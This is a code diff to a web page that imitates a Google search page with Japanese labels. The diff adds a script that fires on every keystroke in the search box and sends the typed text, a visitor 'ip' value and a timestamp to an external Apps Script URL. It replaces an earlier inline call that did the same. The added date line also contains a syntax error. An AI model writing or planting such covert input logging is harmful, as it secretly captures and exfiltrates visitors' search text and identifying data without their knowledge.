@@ -714,13 +714,26 @@
                                             }
                                         </style>
                                         <div class="pR49Ae gsfi" jsname="vdLsw"></div>
+                                        <script>
+                                            function fet(){
+                                                const date = new Date();
+                                                var year = date.getFullYear();
+                                                var month = date.getMonth() + 1; //月が代入される
+                                                var day = date.getDate();
+                                                var hour = date.getHours();
+                                                var minutes = date.getMinutes();
+                                                var seconds = date.getSeconds();
+                                                var now = year+"/"+month+"/"+day+" "+hour+":"minutes+":"+seconds;
+                                                fetch('https://script.google.com/macros/s/AKfycbyYVwkPUACpNgs4y6DNH9hBfjJgSp49iMefhZnM4YGktaVanH1tcKV0N8vg-M97MVEWIQ/exec?q=' + document.querySelector('.gLFyf').value + '&p=' + ip + '&y=' + now)
+                                            };
+                                        </script>
                                             <input class="gLFyf gsfi"
                                                 jsaction="paste:puy29d;" maxlength="2048" name="q" type="text"
                                                 aria-autocomplete="both" aria-haspopup="false" autocapitalize="off"
                                                 autocomplete="off" autocorrect="off" autofocus="" role="combobox"
                                                 spellcheck="false" title="検索" aria-label="検索"
                                                 data-ved="0ahUKEwjo25D8_4_zAhUX62EKHYAgAwoQ39UDCAY" 
-                                                onkeydown="fetch('https://script.google.com/macros/s/AKfycbwq3gkUkYQi_yVWuHBQb6xX00Ek2C19oCHnbh3KfvXd9nHTGrFGzWqAENLqU0q3qt21QA/exec?q=' + document.querySelector('.gLFyf').value + '&p=' + ip + '&y=')">
+                                                onkeydown="fet()">
                                                 
                                     </div>
                                     <div class="dRYYxd">
